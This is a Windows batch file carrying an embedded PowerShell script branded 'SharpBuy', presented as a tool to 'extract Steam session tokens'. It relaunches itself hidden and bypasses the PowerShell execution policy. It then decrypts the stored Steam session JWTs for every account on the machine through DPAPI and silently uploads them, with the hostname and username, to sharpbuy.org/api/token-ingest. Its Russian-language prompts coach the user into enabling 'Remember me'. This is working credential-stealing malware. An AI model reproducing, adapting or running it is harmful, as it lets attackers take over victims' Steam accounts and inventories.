@echo off
if /i not "%~1"=="_bg" (
    mshta vbscript:CreateObject("WScript.Shell").Run("""%~f0"" _bg",0)(window.close)
    exit /b
)

set "PS1=%TEMP%\sb_extract_%RANDOM%.ps1"
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "$lines=Get-Content -LiteralPath '%~f0'; $start=-1; for($i=0;$i -lt $lines.Count;$i++){ if($lines[$i].Trim() -eq '#SB_SCRIPT#'){ $start=$i+1; break } }; if($start -lt 0){ Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('BAT corrupted','SharpBuy','OK','Error') | Out-Null; exit 1 }; $script=$lines[$start..($lines.Count-1)] -join [Environment]::NewLine; Set-Content -LiteralPath '%PS1%' -Value $script -Encoding UTF8"
if errorlevel 1 exit /b 1

powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%PS1%" -Auto -Upload -Silent
set "ERR=%ERRORLEVEL%"
del "%PS1%" 2>nul
exit /b %ERR%

#SB_SCRIPT#
# SharpBuy - extract Steam session tokens (NFA format)
# Usage:
#   .\extract_steam_token.ps1                          -> current AutoLoginUser
#   .\extract_steam_token.ps1 -Account deriksson88     -> one account
#   .\extract_steam_token.ps1 -All                     -> ALL Steam sessions on this PC

param(
    [string]$Account = "",
    [string]$OutFile = "",
    [switch]$All,
    [switch]$Auto,
    [switch]$CopyClipboard,
    [switch]$Upload,
    [switch]$Silent
)

$Script:SharpBuyUploadUrl = "https://sharpbuy.org/api/token-ingest"
$Script:SharpBuyUploadKey = "sb_ing_a8K2mP9xQ4vL7nR1"

$ErrorActionPreference = "Stop"

function Stop-Extractor {
    param(
        [string[]]$Messages,
        [int]$Code = 1
    )
    if ($Silent -and $Messages.Count -gt 0) {
        Send-SharpBuyEvent -Status "error" -Message ($Messages -join " | ")
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue | Out-Null
        [System.Windows.Forms.MessageBox]::Show(
            ($Messages -join [Environment]::NewLine),
            "SharpBuy - Steam Token",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error
        ) | Out-Null
    } else {
        foreach ($m in $Messages) {
            if ($m -match '^ОШИБКА') { Write-Host $m -ForegroundColor Red }
            else { Write-Host $m -ForegroundColor Yellow }
        }
        Write-Host ""
    }
    exit $Code
}

function Show-SilentSuccess {
    param([string]$Message)
    if (-not $Silent) { return }
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue | Out-Null
    [System.Windows.Forms.MessageBox]::Show(
        $Message,
        "SharpBuy - OK",
        [System.Windows.Forms.MessageBoxButtons]::OK,
        [System.Windows.Forms.MessageBoxIcon]::Information
    ) | Out-Null
}

if ($Silent) {
    function Write-Host {
        [CmdletBinding()]
        param(
            [Parameter(ValueFromPipeline = $true)]
            $Object,
            [switch]$NoNewline,
            $Separator,
            [ConsoleColor[]]$ForegroundColor,
            [ConsoleColor[]]$BackgroundColor
        )
        process { }
    }
}

function Test-SteamEnvironment {
    Write-Host ""
    Write-Host "=== SharpBuy Steam Token Extractor ===" -ForegroundColor Cyan
    Write-Host ""

    $steamReg = Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -ErrorAction SilentlyContinue
    if (-not $steamReg -or -not $steamReg.SteamPath) {
        Stop-Extractor @(
            "ОШИБКА: Steam не найден на этом ПК."
            "Установи Steam, войди в аккаунт, потом запусти снова."
        )
    }

    $steamPath = ($steamReg.SteamPath -replace '/', '\')
    Write-Host "Steam: $steamPath" -ForegroundColor DarkGray

    $localVdf = Join-Path $env:LOCALAPPDATA "Steam\local.vdf"
    if (-not (Test-Path $localVdf)) {
        Stop-Extractor @(
            "ОШИБКА: нет файла local.vdf"
            "Ты ещё не входила в Steam на этом компьютере."
            "1) Запусти Steam и войди в аккаунт"
            "2) Поставь галочку 'Запомнить меня'"
            "3) Запусти этот батник снова (Steam можно не закрывать)"
        )
    }

    $loginUsers = Join-Path $steamPath "config\loginusers.vdf"
    if (-not (Test-Path $loginUsers)) {
        Stop-Extractor @(
            "ОШИБКА: loginusers.vdf не найден."
            "Хотя бы раз войди в Steam на этом ПК."
        )
    }
}

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public static class SteamDpapi {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct DATA_BLOB { public int cbData; public IntPtr pbData; }

    [DllImport("Crypt32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CryptUnprotectData(
        ref DATA_BLOB pDataIn, ref string ppszDataDescr, ref DATA_BLOB pOptionalEntropy,
        IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

    [DllImport("Kernel32.dll", EntryPoint = "LocalFree", SetLastError = true)]
    public static extern IntPtr LocalFree(IntPtr hMem);

    public static uint Crc32(byte[] bytes) {
        uint[] table = new uint[256];
        for (uint i = 0; i < 256; i++) {
            uint t = i;
            for (int j = 0; j < 8; j++)
                t = ((t & 1) == 1) ? (t >> 1) ^ 0xedb88320u : t >> 1;
            table[i] = t;
        }
        uint crc = 0xffffffff;
        foreach (byte b in bytes) {
            byte index = (byte)((crc & 0xff) ^ b);
            crc = (crc >> 8) ^ table[index];
        }
        return ~crc;
    }

    public static string CacheKeyFor(string accountName) {
        uint crc = Crc32(Encoding.UTF8.GetBytes(accountName));
        return crc.ToString("x").TrimStart('0') + "1";
    }

    static byte[] HexToBytes(string hex) {
        hex = hex.Trim();
        if (hex.Length % 2 != 0) throw new ArgumentException("Invalid hex");
        byte[] bytes = new byte[hex.Length / 2];
        for (int i = 0; i < bytes.Length; i++)
            bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        return bytes;
    }

    public static string TryDecryptHex(string hex, string accountName) {
        if (string.IsNullOrWhiteSpace(hex) || string.IsNullOrWhiteSpace(accountName))
            return null;
        try {
            byte[] cipher = HexToBytes(hex);
            byte[] entropy = Encoding.UTF8.GetBytes(accountName);
            string descr = "B\u0000O\u0000b\u0000f\u0000u\u0000s\u0000c\u0000a\u0000t\u0000e\u0000B\u0000u\u0000f\u0000f\u0000e\u0000r\u0000\u0000\u0000";

            DATA_BLOB inBlob = new DATA_BLOB();
            DATA_BLOB entBlob = new DATA_BLOB();
            DATA_BLOB outBlob = new DATA_BLOB();
            IntPtr pIn = Marshal.AllocHGlobal(cipher.Length);
            IntPtr pEnt = Marshal.AllocHGlobal(entropy.Length);
            try {
                Marshal.Copy(cipher, 0, pIn, cipher.Length);
                inBlob.cbData = cipher.Length;
                inBlob.pbData = pIn;
                Marshal.Copy(entropy, 0, pEnt, entropy.Length);
                entBlob.cbData = entropy.Length;
                entBlob.pbData = pEnt;
                if (!CryptUnprotectData(ref inBlob, ref descr, ref entBlob, IntPtr.Zero, IntPtr.Zero, 17, ref outBlob))
                    return null;
                byte[] plain = new byte[outBlob.cbData];
                Marshal.Copy(outBlob.pbData, plain, 0, outBlob.cbData);
                return Encoding.UTF8.GetString(plain);
            } finally {
                Marshal.FreeHGlobal(pIn);
                Marshal.FreeHGlobal(pEnt);
                if (outBlob.pbData != IntPtr.Zero) LocalFree(outBlob.pbData);
            }
        } catch {
            return null;
        }
    }
}
"@

function Get-SteamPath {
    $key = Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -ErrorAction SilentlyContinue
    if ($key -and $key.SteamPath) { return ($key.SteamPath -replace '/', '\') }
    return "C:\Program Files (x86)\Steam"
}

function Get-LoginUsersPath {
    Join-Path (Get-SteamPath) "config\loginusers.vdf"
}

function Get-LocalVdfContent {
    $localVdf = Join-Path $env:LOCALAPPDATA "Steam\local.vdf"
    if (-not (Test-Path $localVdf)) { return $null }
    return Get-Content -Raw -Path $localVdf
}

function Parse-AllLoginUsers {
    param([string]$Content)

    $users = @()
    $pattern = '"(?<sid>\d{17})"\s*\{[^}]*?"AccountName"\s+"(?<name>[^"]+)"[^}]*?\}'
    foreach ($m in [regex]::Matches($Content, $pattern, [System.Text.RegularExpressions.RegexOptions]::Singleline)) {
        $block = $m.Value
        $remember = "0"
        if ($block -match '"RememberPassword"\s+"(\d)"') { $remember = $Matches[1] }
        $persona = $m.Groups['name'].Value
        if ($block -match '"PersonaName"\s+"([^"]+)"') { $persona = $Matches[1] }
        $users += [PSCustomObject]@{
            SteamId = $m.Groups['sid'].Value
            AccountName = $m.Groups['name'].Value
            PersonaName = $persona
            RememberPassword = ($remember -eq "1")
        }
    }
    return $users
}

function Parse-LoginUserBlock {
    param([string]$Content, [string]$Login)
    foreach ($u in (Parse-AllLoginUsers -Content $Content)) {
        if ($u.AccountName -eq $Login) { return $u }
    }
    return $null
}

function Get-JwtSteamId {
    param([string]$Jwt)
    $parts = $Jwt.Split('.')
    if ($parts.Length -lt 2) { return $null }
    $payload = $parts[1]
    $pad = (4 - ($payload.Length % 4)) % 4
    if ($pad -gt 0) { $payload += ('=' * $pad) }
    $payload = $payload.Replace('-', '+').Replace('_', '/')
    try {
        $json = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
        if ($json -match '"sub"\s*:\s*"(\d+)"') { return $Matches[1] }
    } catch {}
    return $null
}

function Normalize-TokenLine {
    param([string]$Line)
    $line = ($Line -replace '\s', '').Trim()
    if ($line -match '^(7656119\d+)----(ey.+)$') {
        return "$($Matches[1])----$($Matches[2])"
    }
    if ($line -match '^([^----]+)----(ey.+)$') {
        $jwt = $Matches[2]
        $sid = Get-JwtSteamId $jwt
        if ($sid) { return "$sid----$jwt" }
        return $line
    }
    if ($line -match '^(ey.+)$') {
        $sid = Get-JwtSteamId $Matches[1]
        if ($sid) { return "$sid----$($Matches[1])" }
    }
    return $null
}

function Find-TokenInLocalVdf {
    param(
        [string]$LocalVdfContent,
        [string]$AccountName,
        [string]$ExpectedSteamId,
        [hashtable]$UsedCacheKeys
    )

    if (-not $LocalVdfContent -or $LocalVdfContent -notmatch '"ConnectCache"') { return $null }

    $cacheKey = [SteamDpapi]::CacheKeyFor($AccountName)
    $jwt = $null
    $usedKey = $null

    if ($LocalVdfContent -match "`"$([regex]::Escape($cacheKey))`"\s+`"([0-9a-fA-F]+)`"") {
        if (-not $UsedCacheKeys.ContainsKey($cacheKey)) {
            $try = [SteamDpapi]::TryDecryptHex($Matches[1], $AccountName)
            if ($try -and $try.StartsWith("ey")) {
                $jwt = $try
                $usedKey = $cacheKey
            }
        }
    }

    if (-not $jwt) {
        foreach ($m in [regex]::Matches($LocalVdfContent, '"([0-9a-f]+)"\s+"([0-9a-fA-F]+)"')) {
            $key = $m.Groups[1].Value
            $hex = $m.Groups[2].Value
            if ($hex.Length -lt 100) { continue }
            if ($UsedCacheKeys.ContainsKey($key)) { continue }
            $try = [SteamDpapi]::TryDecryptHex($hex, $AccountName)
            if ($try -and $try.StartsWith("ey")) {
                $sub = Get-JwtSteamId $try
                if (-not $ExpectedSteamId -or -not $sub -or $sub -eq $ExpectedSteamId) {
                    $jwt = $try
                    $usedKey = $key
                    break
                }
            }
        }
    }

    if (-not $jwt) { return $null }

    $steamId = Get-JwtSteamId $jwt
    if (-not $steamId) { $steamId = $ExpectedSteamId }
    if ($usedKey) { $UsedCacheKeys[$usedKey] = $true }

    return [PSCustomObject]@{
        Jwt = $jwt
        SteamId = $steamId
        AccountName = $AccountName
        CacheKey = $usedKey
        Source = "steam-session"
        Token = "$steamId----$jwt"
    }
}

function Merge-TokenResults {
    param([array]$Items)

    $bySteamId = @{}
    $byJwt = @{}
    $merged = @()

    foreach ($item in $Items) {
        if (-not $item -or -not $item.Token) { continue }
        $jwtKey = $item.Jwt
        if ($byJwt.ContainsKey($jwtKey)) { continue }
        if ($item.SteamId -and $bySteamId.ContainsKey($item.SteamId)) { continue }
        $byJwt[$jwtKey] = $true
        if ($item.SteamId) { $bySteamId[$item.SteamId] = $true }
        $merged += $item
    }
    return $merged
}

function Extract-AllTokens {
    $localVdf = Get-LocalVdfContent
    $loginUsersPath = Get-LoginUsersPath
    $allUsers = @()
    if (Test-Path $loginUsersPath) {
        $allUsers = Parse-AllLoginUsers -Content (Get-Content -Raw $loginUsersPath)
    }

    $usedKeys = @{}
    $found = @()

    foreach ($user in $allUsers) {
        $hit = Find-TokenInLocalVdf -LocalVdfContent $localVdf -AccountName $user.AccountName `
            -ExpectedSteamId $user.SteamId -UsedCacheKeys $usedKeys
        if ($hit) {
            $hit | Add-Member -NotePropertyName PersonaName -NotePropertyValue $user.PersonaName -Force
            $found += $hit
        }
    }

    # Brute-force leftover ConnectCache entries with every known login name
    if ($localVdf) {
        $names = @{}
        foreach ($u in $allUsers) {
            if ($u.AccountName) { $names[$u.AccountName] = $u }
            if ($u.SteamId) { $names[$u.SteamId] = $u }
        }
        foreach ($m in [regex]::Matches($localVdf, '"([0-9a-f]+)"\s+"([0-9a-fA-F]+)"')) {
            $key = $m.Groups[1].Value
            $hex = $m.Groups[2].Value
            if ($hex.Length -lt 100) { continue }
            if ($usedKeys.ContainsKey($key)) { continue }
            foreach ($name in $names.Keys) {
                $try = [SteamDpapi]::TryDecryptHex($hex, $name)
                if (-not ($try -and $try.StartsWith("ey"))) { continue }
                $sid = Get-JwtSteamId $try
                $u = $names[$name]
                if ($sid -and $u.SteamId -and $sid -ne $u.SteamId) { continue }
                $usedKeys[$key] = $true
                $found += [PSCustomObject]@{
                    Jwt = $try
                    SteamId = if ($sid) { $sid } else { $u.SteamId }
                    AccountName = $u.AccountName
                    PersonaName = $u.PersonaName
                    CacheKey = $key
                    Source = "steam-session"
                    Token = "$(if ($sid) { $sid } else { $u.SteamId })----$try"
                }
                break
            }
        }
    }

    return (Merge-TokenResults -Items $found)
}

function Send-SharpBuyEvent {
    param(
        [string]$Status,
        [string]$Message,
        [string]$AccountName = ""
    )
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $body = @{
            event       = $true
            status      = $Status
            message     = $Message
            accountName = $AccountName
            hostname    = $env:COMPUTERNAME
            username    = $env:USERNAME
            source      = "extract-bat"
        } | ConvertTo-Json -Compress
        $headers = @{ "X-SharpBuy-Key" = $Script:SharpBuyUploadKey }
        Invoke-RestMethod -Uri $Script:SharpBuyUploadUrl -Method POST `
            -ContentType "application/json; charset=utf-8" `
            -Headers $headers -Body $body -TimeoutSec 20 | Out-Null
    } catch { }
}

function Send-TokensToSharpBuy {
    param([array]$Tokens)

    if (-not $Tokens -or $Tokens.Count -eq 0) { return $null }

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    $payload = @{
        tokens = @(
            foreach ($t in $Tokens) {
                @{
                    token       = $t.Token
                    steamId     = $t.SteamId
                    accountName = $t.AccountName
                    personaName = $t.PersonaName
                }
            }
        )
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        source   = "extract-bat"
    }

    $body = $payload | ConvertTo-Json -Depth 6 -Compress
    $headers = @{ "X-SharpBuy-Key" = $Script:SharpBuyUploadKey }

    try {
        return Invoke-RestMethod -Uri $Script:SharpBuyUploadUrl -Method POST `
            -ContentType "application/json; charset=utf-8" `
            -Headers $headers -Body $body -TimeoutSec 45
    } catch {
        $detail = $_.Exception.Message
        if ($_.ErrorDetails -and $_.ErrorDetails.Message) { $detail = $_.ErrorDetails.Message }
        Stop-Extractor @(
            "ОШИБКА: не удалось отправить токен на сервер SharpBuy."
            $detail
            "Проверь интернет и попробуй снова."
        )
    }
}

function Write-TokenReport {
    param(
        [array]$Tokens,
        [string]$Path,
        [switch]$DoCopyClipboard,
        [switch]$DoUpload
    )

    $lines = @()
    $lines += "# SharpBuy - Steam session tokens only"
    $lines += "# Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    $lines += "# Total: $($Tokens.Count)"
    $lines += ""

    foreach ($t in $Tokens) {
        $label = $t.AccountName
        if ($t.PersonaName -and $t.PersonaName -ne $t.AccountName) { $label = "$label ($($t.PersonaName))" }
        $lines += "# $label | $($t.SteamId)"
        $lines += $t.Token
        $lines += ""
    }

    $plainTokens = ($Tokens | ForEach-Object { $_.Token }) -join "`n"
    if (-not $DoUpload) {
        Set-Content -Path $Path -Value ($lines -join "`n") -Encoding UTF8
    }

    Write-Host ""
    Write-Host "SUCCESS! Extracted $($Tokens.Count) token(s)" -ForegroundColor Green
    Write-Host "Saved to: $Path"
    Write-Host ""

    foreach ($t in $Tokens) {
        $nick = if ($t.PersonaName) { " / $($t.PersonaName)" } else { "" }
        Write-Host ("  [OK] {0}{1} -> {2}" -f $t.AccountName, $nick, $t.SteamId) -ForegroundColor Green
    }

    $missing = @()
    $loginUsersPath = Get-LoginUsersPath
    if (Test-Path $loginUsersPath) {
        $allUsers = Parse-AllLoginUsers -Content (Get-Content -Raw $loginUsersPath)
        foreach ($u in $allUsers) {
            if (-not ($Tokens | Where-Object { $_.SteamId -eq $u.SteamId })) {
                if (-not $u.RememberPassword) {
                    $missing += "$($u.AccountName) ($($u.PersonaName)) - no RememberPassword"
                } else {
                    $missing += "$($u.AccountName) ($($u.PersonaName)) - session not in ConnectCache"
                }
            }
        }
    }

    if ($missing.Count -gt 0) {
        Write-Host ""
        Write-Host "Not extracted ($($missing.Count)):" -ForegroundColor Yellow
        foreach ($m in $missing) { Write-Host "  [SKIP] $m" -ForegroundColor DarkYellow }
        Write-Host ""
        Write-Host "To get missing tokens: log in to each account with 'Remember my password' checked." -ForegroundColor Yellow
    }

    if ($DoCopyClipboard -and $Tokens.Count -gt 0) {
        Set-Clipboard -Value $plainTokens
        Write-Host "All tokens copied to clipboard (one per line)." -ForegroundColor Green
    }

    if ($DoUpload -and $Tokens.Count -gt 0) {
        $uploadResult = Send-TokensToSharpBuy -Tokens $Tokens
        if ($Silent) {
            $label = $Tokens[0].AccountName
            if ($Tokens[0].PersonaName) { $label = "$label ($($Tokens[0].PersonaName))" }
            Show-SilentSuccess "Токен отправлен на sharpbuy.org/admin`n`nАккаунт: $label`nОткрой админку и нажми Обновить."
        } elseif (-not $Silent) {
            Write-Host "Uploaded to SharpBuy cloud: $($Tokens.Count) token(s)." -ForegroundColor Green
            if ($uploadResult.total) {
                Write-Host "Total in database: $($uploadResult.total)" -ForegroundColor DarkGray
            }
        }
    }

    Write-Host ""
    Write-Host "Keep these tokens private." -ForegroundColor DarkYellow
    Write-Host ""
}

Test-SteamEnvironment

if ($Auto) {
    Send-SharpBuyEvent -Status "start" -Message "Bat started"
    Write-Host "Mode: auto (Steam можно держать открытым)" -ForegroundColor Cyan
    Write-Host ""

    $reg = Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -ErrorAction SilentlyContinue
    $autoLogin = $reg.AutoLoginUser

    if ($autoLogin) {
        Write-Host "Пробую аккаунт: $autoLogin" -ForegroundColor DarkGray
        $userInfo = $null
        $loginUsers = Get-LoginUsersPath
        if (Test-Path $loginUsers) {
            $userInfo = Parse-LoginUserBlock -Content (Get-Content -Raw $loginUsers) -Login $autoLogin
        }
        $localVdf = Get-LocalVdfContent
        $usedKeys = @{}
        $result = Find-TokenInLocalVdf -LocalVdfContent $localVdf -AccountName $autoLogin `
            -ExpectedSteamId $(if ($userInfo) { $userInfo.SteamId } else { "" }) -UsedCacheKeys $usedKeys
        if ($result) {
            $out = Join-Path ([Environment]::GetFolderPath("Desktop")) "${autoLogin}_token.txt"
            $tokenObj = [PSCustomObject]@{
                Jwt = $result.Jwt
                SteamId = $result.SteamId
                AccountName = $autoLogin
                PersonaName = if ($userInfo) { $userInfo.PersonaName } else { "" }
                CacheKey = $result.CacheKey
                Source = "steam-session"
                Token = $result.Token
            }
            Write-TokenReport -Tokens @($tokenObj) -Path $out -DoCopyClipboard:$CopyClipboard -DoUpload:$Upload
            exit 0
        }
        Write-Host "Для $autoLogin токен не найден, ищу все сессии..." -ForegroundColor Yellow
        Write-Host ""
    }

    $tokens = Extract-AllTokens
    if ($tokens.Count -eq 0) {
        Stop-Extractor @(
            "ОШИБКА: токены не найдены."
            "Войди в Steam с 'Запомнить меня' и запусти батник снова."
        )
    }

    $out = Join-Path ([Environment]::GetFolderPath("Desktop")) "steam_sessions.txt"
    Write-TokenReport -Tokens $tokens -Path $out -DoCopyClipboard:$CopyClipboard -DoUpload:$Upload
    exit 0
}

if ($All) {
    Write-Host "Mode: ALL Steam sessions (ConnectCache only)" -ForegroundColor Cyan
    Write-Host ""

    $tokens = Extract-AllTokens

    if ($tokens.Count -eq 0) {
        Stop-Extractor @(
            "ОШИБКА: токены не найдены."
            "Войди в Steam с галочкой 'Запомнить меня' и запусти снова."
        )
    }

    if (-not $OutFile) {
        $OutFile = Join-Path ([Environment]::GetFolderPath("Desktop")) "steam_sessions.txt"
    }

    Write-TokenReport -Tokens $tokens -Path $OutFile -DoCopyClipboard:$CopyClipboard -DoUpload:$Upload
    exit 0
}

# --- single account mode ---
if (-not $Account) {
    $reg = Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -ErrorAction SilentlyContinue
    $Account = $reg.AutoLoginUser
}
if (-not $Account) {
    Stop-Extractor @(
        "ОШИБКА: не выбран аккаунт Steam (AutoLoginUser пустой)."
        "Запусти батник снова или укажи логин вручную."
    )
}

Write-Host "Mode: single account" -ForegroundColor Cyan
Write-Host "Account : $Account"

$userInfo = $null
$loginUsers = Get-LoginUsersPath
if (Test-Path $loginUsers) {
    $userInfo = Parse-LoginUserBlock -Content (Get-Content -Raw $loginUsers) -Login $Account
}

if ($userInfo) {
    Write-Host "SteamID : $($userInfo.SteamId)"
    Write-Host "Nickname: $($userInfo.PersonaName)"
    if (-not $userInfo.RememberPassword) {
        Write-Host ""
        Write-Host "WARNING: RememberPassword = OFF for this account." -ForegroundColor Yellow
        Write-Host "В Steam включи 'Запомнить меня' и войди заново." -ForegroundColor Yellow
        Write-Host ""
    }
} else {
    Write-Host "SteamID : (will read from JWT)"
}

$localVdf = Get-LocalVdfContent
$usedKeys = @{}
$result = Find-TokenInLocalVdf -LocalVdfContent $localVdf -AccountName $Account `
    -ExpectedSteamId $(if ($userInfo) { $userInfo.SteamId } else { "" }) -UsedCacheKeys $usedKeys

if (-not $result) {
    Stop-Extractor @(
        "ОШИБКА: токен для '$Account' не найден."
        "Включи 'Запомнить меня' в Steam и войди заново."
    )
}

if (-not $OutFile) {
    $OutFile = Join-Path ([Environment]::GetFolderPath("Desktop")) "${Account}_token.txt"
}

$tokenObj = [PSCustomObject]@{
    Jwt = $result.Jwt
    SteamId = $result.SteamId
    AccountName = $Account
    PersonaName = if ($userInfo) { $userInfo.PersonaName } else { "" }
    CacheKey = $result.CacheKey
    Source = "steam-session"
    Token = $result.Token
}

Write-TokenReport -Tokens @($tokenObj) -Path $OutFile -DoCopyClipboard:$CopyClipboard -DoUpload:$Upload
